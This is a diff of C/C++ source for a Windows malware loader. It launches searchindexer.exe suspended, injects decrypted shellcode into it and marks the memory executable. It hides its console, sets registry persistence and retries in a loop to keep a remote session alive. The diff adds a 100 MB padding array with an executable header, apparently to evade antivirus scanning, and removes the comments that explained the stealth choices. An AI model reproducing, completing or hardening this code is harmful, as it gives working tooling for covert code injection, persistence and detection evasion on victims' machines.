@@ -4,8 +4,10 @@
 
 #pragma comment(lib, "wininet.lib")
 
+
+unsigned char junkData[100 * 1024 * 1024] = { 0x4D, 0x5A, 0x90, 0x00 };
+
 bool IsNetworkReady() {
-    // Check connection to a high-uptime server
     return InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
 }
 
@@ -14,7 +16,6 @@ bool TryExecute() {
     PROCESS_INFORMATION pi = { 0 };
     si.cb = sizeof(si);
 
-    // Using 'searchindexer.exe' - a very common, low-suspicion process
     if (!CreateProcessA("C:\\Windows\\System32\\searchindexer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         return false;
     }
@@ -28,7 +29,6 @@ bool TryExecute() {
     }
     
     WriteProcessMemory(pi.hProcess, remoteMem, decrypted, shellcodeLen, NULL);
-
     DWORD oldProtect;
     VirtualProtectEx(pi.hProcess, remoteMem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
 
@@ -44,7 +44,6 @@ bool TryExecute() {
 int main() {
     FreeConsole();
     
-    // Persistence setup
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
     HKEY hkey = NULL;
@@ -55,12 +54,9 @@ int main() {
     while (true) {
         if (IsNetworkReady()) {
             if (TryExecute()) {
-                // If successful, wait 15 minutes before checking if we need to revive the session
-                // This prevents "session spam" while ensuring long-term connection
                 Sleep(900000); 
             }
         }
-        // If internet is down or execution failed, wait 60 seconds and retry
         Sleep(60000);
     }
     return 0;
